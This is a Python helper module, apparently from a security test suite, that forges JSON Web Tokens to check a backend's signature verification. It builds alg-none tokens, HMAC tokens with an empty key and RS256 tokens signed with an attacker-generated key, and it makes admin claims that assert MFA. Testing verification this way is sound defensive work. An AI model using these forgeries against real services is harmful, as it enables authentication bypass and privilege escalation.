"""Attacker JWT tooling — hand-rolled so it bypasses any signing library's guard
rails and tests the BACKEND's verification (especially algorithm pinning)."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time


def _b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def forge(header: dict, claims: dict, secret: bytes | None = None) -> str:
    """An unsigned token (alg none / no secret) or an HMAC-signed one. `secret`
    may be b"" — signing with a zero-length key is itself an attack."""
    seg = _b64(json.dumps(header).encode()) + "." + _b64(json.dumps(claims).encode())
    if str(header.get("alg", "")).lower() == "none" or secret is None:
        return seg + "."
    digest = _DIGEST.get(header.get("alg"), hashlib.sha256)
    sig = hmac.new(secret, seg.encode(), digest).digest()
    return seg + "." + _b64(sig)


_ATTACKER = {}


def attacker_key():
    """(private key, public JWK) of a key pair the ATTACKER generated. Any token
    signed with it is a forgery, whatever its header says about where to find
    the matching public key."""
    if not _ATTACKER:
        from cryptography.hazmat.primitives.asymmetric import rsa
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        nums = key.public_key().public_numbers()
        enc = lambda i: _b64(i.to_bytes((i.bit_length() + 7) // 8, "big"))
        _ATTACKER.update(key=key, jwk={"kty": "RSA", "use": "sig", "alg": "RS256",
                                       "kid": "attacker", "n": enc(nums.n), "e": enc(nums.e)})
    return _ATTACKER["key"], _ATTACKER["jwk"]


def forge_rs256(header: dict, claims: dict) -> str:
    """A genuinely RS256-signed token — signed with the attacker's own key."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    key, _ = attacker_key()
    seg = _b64(json.dumps({**header, "alg": "RS256"}).encode()) + "." + _b64(json.dumps(claims).encode())
    return seg + "." + _b64(key.sign(seg.encode(), padding.PKCS1v15(), hashes.SHA256()))


def admin_claims(sub: str, uid: int, iss: str, aud: str) -> dict:
    now = int(time.time())
    return {"sub": sub, "uid": uid, "role": "admin", "mfa": True, "jti": "forged",
            "iss": iss, "aud": aud, "iat": now, "exp": now + 900}


def expired_claims(sub: str, uid: int, iss: str, aud: str) -> dict:
    now = int(time.time())
    return {"sub": sub, "uid": uid, "role": "user", "jti": "forged",
            "iss": iss, "aud": aud, "iat": now - 900, "exp": now - 10}


def payload_unverified(token: str) -> dict:
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg))
    except Exception:
        return {}
